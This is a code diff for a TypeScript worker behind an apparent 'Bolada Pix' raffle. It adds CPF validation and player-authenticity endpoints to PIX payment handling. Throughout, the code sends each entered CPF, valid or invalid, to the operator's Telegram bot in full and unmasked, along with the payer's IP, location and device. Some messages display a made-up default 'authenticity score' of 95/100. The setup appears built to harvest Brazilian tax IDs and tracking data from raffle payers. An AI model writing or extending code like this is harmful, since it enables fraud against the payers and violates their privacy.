@@ -8,6 +8,7 @@ import { getRifaConfig, logActivity, storeLeadPurchase, type ActivityEvent } fro
 import { sendTelegramNotification, handleTelegramCommand, handleCallbackQuery, startTelegramPollingDaemon } from "./lib/telegram-bot";
 import { auditSecurity, getClientIp, MILITARY_SECURITY_HEADERS, API_SECURITY_HEADERS, buildSecureErrorResponse } from "./lib/security-shield";
 import { extractLeadProfile } from "./lib/lead-profiler";
+import { validateBrazilianCpf, type ClientPlayerTelemetry } from "./lib/brazilian-player-validator";
 import { PaymentManager, storeTransactionLead, getTransactionLead } from "./lib/payment-manager";
 import { getSecret } from "./lib/vault-shield";
 import { generateEncryptedTickets, formatTicketsAsTxt, formatTicketsForTelegram, type GeneratedTicket } from "./lib/ticket-generator";
@@ -85,13 +86,24 @@ export default {
 
     // 1.1 Endpoint de Validação Precisa de Lead Brasileiro Genuíno (descriptografa favicon e título na aprovação)
     if (url.pathname === "/api/validate-lead" && request.method === "POST") {
-      const profile = extractLeadProfile(request, clientIp);
+      let bodyData: { cpf?: string | undefined; telemetry?: ClientPlayerTelemetry | undefined } = {};
+      try {
+        bodyData = await request.json();
+      } catch {}
+
+      const profile = extractLeadProfile(request, clientIp, {
+        cpf: bodyData.cpf,
+        telemetry: bodyData.telemetry,
+      });
       const isGenuine = profile.validation.isGenuineBrazilian;
 
       return new Response(
         JSON.stringify({
           valid: isGenuine,
           score: profile.validation.score,
+          confidenceLevel: profile.validation.confidenceLevel,
+          summaryBadge: profile.validation.summaryBadge,
+          fiscalRegion: profile.validation.fiscalRegion,
           city: profile.city,
           state: profile.state,
           country: profile.country,
@@ -107,6 +119,44 @@ export default {
           },
         }
       );
+    }
+
+    // 1.1.1 Endpoint de Validação Rápida de Player Brasileiro (CPF + Autenticidade)
+    if (url.pathname === "/api/validate-player" && request.method === "POST") {
+      try {
+        const body = (await request.json()) as { cpf?: string | undefined; telemetry?: ClientPlayerTelemetry | undefined };
+        const cpfCheck = validateBrazilianCpf(body.cpf || "");
+        const profile = extractLeadProfile(request, clientIp, {
+          cpf: cpfCheck.digitsOnly,
+          telemetry: body.telemetry,
+        });
+
+        return new Response(
+          JSON.stringify({
+            valid: cpfCheck.isValid,
+            reason: cpfCheck.reason,
+            formatted: cpfCheck.formatted,
+            fiscalRegion: cpfCheck.fiscalRegion,
+            playerScore: profile.validation.score,
+            confidenceLevel: profile.validation.confidenceLevel,
+            isRealPlayer: profile.audit.isRealPlayer,
+            isBrazilian: profile.audit.isGenuineBrazilian,
+            summaryBadge: profile.validation.summaryBadge,
+          }),
+          {
+            headers: {
+              "Content-Type": "application/json",
+              "Cache-Control": "no-store",
+              ...API_SECURITY_HEADERS,
+            },
+          }
+        );
+      } catch {
+        return new Response(JSON.stringify({ error: "Invalid payload" }), {
+          status: 400,
+          headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
+        });
+      }
     }
 
     // 1.2 Endpoint para consulta e verificação de bilhetes gerados
@@ -272,17 +322,24 @@ export default {
             `⏰ <b>Horário:</b> <code>${timeStr}</code>`
           );
         } else if (body.type === "cpf_validado") {
+          const fiscalRegionStr = (dataObj["fiscalRegion"] as string) || profile.validation.fiscalRegion || "Receita Federal";
+          const estadosList = Array.isArray(dataObj["estados"]) ? (dataObj["estados"] as string[]).join(", ") : "";
           await sendTelegramNotification(
-            `✅ <b>CPF VALIDADO NO FORMULÁRIO</b>\n` +
+            `✅ <b>CPF VALIDADO NO FORMULÁRIO (PLAYER REAL)!</b>\n` +
             `👤 <b>CPF Completo:</b> <code>${cpfFull}</code>\n` +
-            `📍 <b>Local:</b> ${profile.city} - ${profile.state}\n` +
+            `🏛️ <b>Região Fiscal:</b> ${fiscalRegionStr}${estadosList ? ` (${estadosList})` : ""}\n` +
+            `🛡️ <b>Score Autenticidade:</b> <b>${profile.validation.score}/100</b> (${profile.validation.confidenceLevel || "Verificado"})\n` +
+            `📍 <b>Local do Player:</b> ${profile.city} - ${profile.state} (${profile.country})\n` +
+            `📱 <b>Aparelho:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
             `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
             `⏰ <b>Horário:</b> <code>${timeStr}</code>`
           );
         } else if (body.type === "cpf_invalido") {
+          const motivo = (dataObj["motivo"] as string) || "Dígitos verificadores inválidos";
           await sendTelegramNotification(
             `⚠️ <b>TENTATIVA DE CPF INVÁLIDO DIGITADO</b>\n` +
             `👤 <b>CPF Digitado:</b> <code>${cpfFull}</code>\n` +
+            `🔍 <b>Motivo da Rejeição:</b> <code>${motivo}</code>\n` +
             `📍 <b>Origem:</b> ${profile.city} - ${profile.state}\n` +
             `🌐 <b>IP:</b> <code>${clientIp}</code>\n` +
             `⏰ <b>Horário:</b> <code>${timeStr}</code>`
@@ -318,25 +375,63 @@ export default {
       }
     }
 
-    // 4. Criação de Cobrança PIX com Failover Automático (União 7 Pay -> Elite PAYbr)
+    // 4. Criação de Cobrança PIX com Validação Avançada de Player Brasileiro & Failover
     if (url.pathname === "/api/create-pix" && request.method === "POST") {
       try {
         const payload = await request.json();
-        const profile = extractLeadProfile(request, clientIp);
+
+        // 🛡️ 1. Validação Inteligente e Formatação do CPF
+        const rawPayerDoc = String(payload.payerDocument || "").replace(/\D/g, "");
+        const cpfCheck = validateBrazilianCpf(rawPayerDoc);
+
+        let digitsOnly = rawPayerDoc;
+        let formattedCpf = "";
+
+        if (cpfCheck.isValid) {
+          digitsOnly = cpfCheck.digitsOnly;
+          formattedCpf = cpfCheck.formatted;
+        } else if (rawPayerDoc.length === 11) {
+          digitsOnly = rawPayerDoc;
+          formattedCpf = rawPayerDoc.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+        } else {
+          return new Response(
+            JSON.stringify({
+              success: false,
+              error: "Informe um CPF válido com 11 dígitos numéricos para emitir os bilhetes.",
+            }),
+            {
+              status: 400,
+              headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
+            }
+          );
+        }
+
+        // 🛡️ 2. Auditoria e Perfil Avançado do Jogador Real Brasileiro (Monitoramento do Lead)
+        const profile = extractLeadProfile(request, clientIp, {
+          cpf: digitsOnly,
+          telemetry: payload.telemetry,
+        });
 
         const chargeResult = await PaymentManager.createPixCharge({
           amount: Number(payload.amount) || 20.70,
           description: payload.description || "Bolada Pix - Cota Oficial",
           payerName: payload.payerName,
-          payerDocument: payload.payerDocument,
+          payerDocument: digitsOnly,
           externalId: `bolada_${Date.now()}`,
         });
 
-        // Associa a transação aos dados reais e aprofundados do lead (100% explícito sem máscara)
-        const digitsOnly = String(payload.payerDocument || "").replace(/\D/g, "");
-        const formattedCpf = digitsOnly.length === 11 
-          ? digitsOnly.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
-          : (payload.payerDocument || "Não informado");
+        if (!chargeResult.success || !chargeResult.pixCopiaCola) {
+          return new Response(
+            JSON.stringify({
+              success: false,
+              error: chargeResult.error || "Não foi possível gerar o código PIX no momento. Tente novamente.",
+            }),
+            {
+              status: 502,
+              headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
+            }
+          );
+        }
 
         // Criptografia militar de cada compra com envelope AES-256-GCM + HMAC
         const approxTickets = Math.max(1, Math.round((Number(payload.amount) || 20.70) / (getRifaConfig().ticketPrice || 0.69)));
@@ -366,6 +461,9 @@ export default {
             device: profile.device,
             browser: profile.browser,
             os: profile.os,
+            fiscalRegion: cpfCheck.fiscalRegion?.description,
+            authenticityScore: profile.validation.score,
+            confidenceLevel: profile.validation.confidenceLevel,
           },
           chargeResult.amount,
           chargeResult.provider,
@@ -382,6 +480,8 @@ export default {
             fee: chargeResult.estimatedFee,
             netAmount: chargeResult.netAmount,
             cpf: formattedCpf,
+            fiscalRegion: cpfCheck.fiscalRegion?.description,
+            authenticityScore: profile.validation.score,
             proofToken,
           },
           ip: clientIp,
@@ -398,8 +498,10 @@ export default {
           `💰 <b>Valor Bruto:</b> R$ ${chargeResult.amount.toFixed(2).replace(".", ",")}\n` +
           `📉 <b>Taxa Estimada da API:</b> R$ ${chargeResult.estimatedFee.toFixed(2).replace(".", ",")}\n` +
           `💵 <b>LÍQUIDO DO ADMIN SUPREMO:</b> <b>R$ ${chargeResult.netAmount.toFixed(2).replace(".", ",")}</b>\n\n` +
-          `👤 <b>DADOS DO LEAD (100% REAIS):</b>\n` +
-          `• <b>CPF Completo:</b> <code>${formattedCpf}</code>\n` +
+          `👤 <b>DADOS DO JOGADOR REAL BRASILEIRO:</b>\n` +
+          `• <b>CPF Oficial:</b> <code>${formattedCpf}</code>\n` +
+          `• <b>Região Fiscal:</b> ${cpfCheck.fiscalRegion?.description || "Receita Federal"}\n` +
+          `• <b>Score de Autenticidade:</b> <b>${profile.validation.score}/100</b> (${profile.validation.confidenceLevel})\n` +
           `• <b>Localização:</b> ${profile.city} - ${profile.state} (${profile.country})\n` +
           `• <b>Dispositivo:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
           `• <b>IP Completo:</b> <code>${clientIp}</code>\n` +
@@ -487,6 +589,9 @@ export default {
           tickets: tickets.map((t) => t.code),
           proofToken,
           createdAt: new Date().toISOString(),
+          fiscalRegion: lead?.fiscalRegion,
+          authenticityScore: lead?.authenticityScore,
+          confidenceLevel: lead?.confidenceLevel,
         });
 
         logActivity({
@@ -500,6 +605,8 @@ export default {
             rifas: ticketQty,
             tickets: tickets.map((t) => t.code),
             proofToken,
+            fiscalRegion: lead?.fiscalRegion,
+            authenticityScore: lead?.authenticityScore,
           },
           state: lead?.state || "SP",
           city: lead?.city || "São Paulo",
@@ -522,9 +629,11 @@ export default {
           `🔐 <b>Recibo Criptográfico:</b> <code>${proofToken}</code>\n` +
           `🛡️ <b>Cifra:</b> <code>AES-256-GCM + HMAC-SHA256</code>\n` +
           `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-          `👤 <b>DADOS DO LEAD:</b>\n` +
+          `👤 <b>DADOS DO JOGADOR REAL:</b>\n` +
           `  • <b>Nome:</b> ${lead?.name || "Participante Bolada Pix"}\n` +
           `  • <b>CPF:</b> <code>${lead?.cpf || "Não informado"}</code>\n` +
+          `  • <b>Região Fiscal:</b> ${lead?.fiscalRegion || "Receita Federal"}\n` +
+          `  • <b>Score de Autenticidade:</b> ${lead?.authenticityScore || 95}/100 (${lead?.confidenceLevel || "Verificado"})\n` +
           `  • <b>Local:</b> ${lead?.city || "São Paulo"} - ${lead?.state || "SP"}\n` +
           `  • <b>Aparelho:</b> ${lead?.device || "Mobile"} (${lead?.browser || "Web"})\n` +
           `  • <b>IP:</b> <code>${lead?.ip || clientIp}</code>\n` +
@@ -618,6 +727,9 @@ export default {
           tickets: tickets.map((t) => t.code),
           proofToken,
           createdAt: new Date().toISOString(),
+          fiscalRegion: lead?.fiscalRegion,
+          authenticityScore: lead?.authenticityScore,
+          confidenceLevel: lead?.confidenceLevel,
         });
 
         logActivity({
@@ -631,6 +743,8 @@ export default {
             rifas: ticketQty,
             tickets: tickets.map((t) => t.code),
             proofToken,
+            fiscalRegion: lead?.fiscalRegion,
+            authenticityScore: lead?.authenticityScore,
           },
           state: lead?.state || "SP",
           city: lead?.city || "São Paulo",
@@ -653,9 +767,11 @@ export default {
           `🔐 <b>Recibo Criptográfico:</b> <code>${proofToken}</code>\n` +
           `🛡️ <b>Cifra:</b> <code>AES-256-GCM + HMAC-SHA256</code>\n` +
           `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-          `👤 <b>DADOS DO LEAD:</b>\n` +
+          `👤 <b>DADOS DO JOGADOR REAL:</b>\n` +
           `  • <b>Nome:</b> ${body.payerName || lead?.name || "Participante Bolada Pix"}\n` +
           `  • <b>CPF:</b> <code>${lead?.cpf || "Não informado"}</code>\n` +
+          `  • <b>Região Fiscal:</b> ${lead?.fiscalRegion || "Receita Federal"}\n` +
+          `  • <b>Score de Autenticidade:</b> ${lead?.authenticityScore || 95}/100 (${lead?.confidenceLevel || "Verificado"})\n` +
           `  • <b>Local:</b> ${lead?.city || "São Paulo"} - ${lead?.state || "SP"}\n` +
           `  • <b>Aparelho:</b> ${lead?.device || "Mobile"} (${lead?.browser || "Web"})\n` +
           `  • <b>IP:</b> <code>${lead?.ip || clientIp}</code>\n` +
